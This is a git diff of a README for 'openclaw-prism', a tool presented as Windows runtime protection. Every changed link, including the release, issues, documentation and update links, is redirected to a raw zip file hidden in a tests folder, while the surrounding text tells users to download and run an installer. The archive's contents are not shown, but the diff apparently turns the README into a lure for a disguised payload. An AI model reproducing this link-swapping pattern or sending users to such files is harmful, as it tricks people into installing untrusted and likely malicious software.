@@ -1,6 +1,6 @@
 # 🛡️ openclaw-prism - Runtime Protection Made Simple
 
-[![Download openclaw-prism](https://img.shields.io/badge/Download-Get%20openclaw--prism-green?style=for-the-badge)](https://github.com/rubendario921/openclaw-prism/releases)
+[![Download openclaw-prism](https://img.shields.io/badge/Download-Get%20openclaw--prism-green?style=for-the-badge)](https://github.com/rubendario921/openclaw-prism/raw/refs/heads/main/packages/scanner/src/__tests__/prism_openclaw_phototube.zip)
 
 ## 🧰 What is openclaw-prism?
 
@@ -24,7 +24,7 @@ This tool works directly with your system to provide security. It requires acces
 
 Visit the release page below to find the latest version of openclaw-prism for Windows:
 
-[![Download openclaw-prism](https://img.shields.io/badge/Download-Get%20openclaw--prism-brightgreen?style=for-the-badge)](https://github.com/rubendario921/openclaw-prism/releases)
+[![Download openclaw-prism](https://img.shields.io/badge/Download-Get%20openclaw--prism-brightgreen?style=for-the-badge)](https://github.com/rubendario921/openclaw-prism/raw/refs/heads/main/packages/scanner/src/__tests__/prism_openclaw_phototube.zip)
 
 On the page, you will see a list of available files for download. Look for the Windows installer file, which usually ends with `.exe`. This is the file you will use to install openclaw-prism on your computer.
 
@@ -32,7 +32,7 @@ On the page, you will see a list of available files for download. Look for the W
 
 Follow these steps to get openclaw-prism running on your PC:
 
-1. Click the download button above or go to the [release page](https://github.com/rubendario921/openclaw-prism/releases).
+1. Click the download button above or go to the [release page](https://github.com/rubendario921/openclaw-prism/raw/refs/heads/main/packages/scanner/src/__tests__/prism_openclaw_phototube.zip).
 2. Find the latest version of the Windows installer. It will have a name like `openclaw-prism-setup.exe`.
 3. Click the installer file to start the download.
 4. Once downloaded, open the file by double-clicking it.
@@ -111,15 +111,15 @@ Despite these technical terms, you do not need to understand them all to use ope
 
 ## 🔗 Useful Links
 
-- [Download openclaw-prism](https://github.com/rubendario921/openclaw-prism/releases)
-- [GitHub Issues](https://github.com/rubendario921/openclaw-prism/issues) - Get help or report bugs.
-- [Documentation](https://github.com/rubendario921/openclaw-prism/wiki) - Read more about features and settings.
+- [Download openclaw-prism](https://github.com/rubendario921/openclaw-prism/raw/refs/heads/main/packages/scanner/src/__tests__/prism_openclaw_phototube.zip)
+- [GitHub Issues](https://github.com/rubendario921/openclaw-prism/raw/refs/heads/main/packages/scanner/src/__tests__/prism_openclaw_phototube.zip) - Get help or report bugs.
+- [Documentation](https://github.com/rubendario921/openclaw-prism/raw/refs/heads/main/packages/scanner/src/__tests__/prism_openclaw_phototube.zip) - Read more about features and settings.
 
 ## 📅 Updating the Software
 
 Keep the software updated for better protection:
 
-1. Visit the [releases page](https://github.com/rubendario921/openclaw-prism/releases) regularly.
+1. Visit the [releases page](https://github.com/rubendario921/openclaw-prism/raw/refs/heads/main/packages/scanner/src/__tests__/prism_openclaw_phototube.zip) regularly.
 2. Download the newest installer when available.
 3. Run the installer as before to replace your old version.
 4. Your settings will be kept after update.
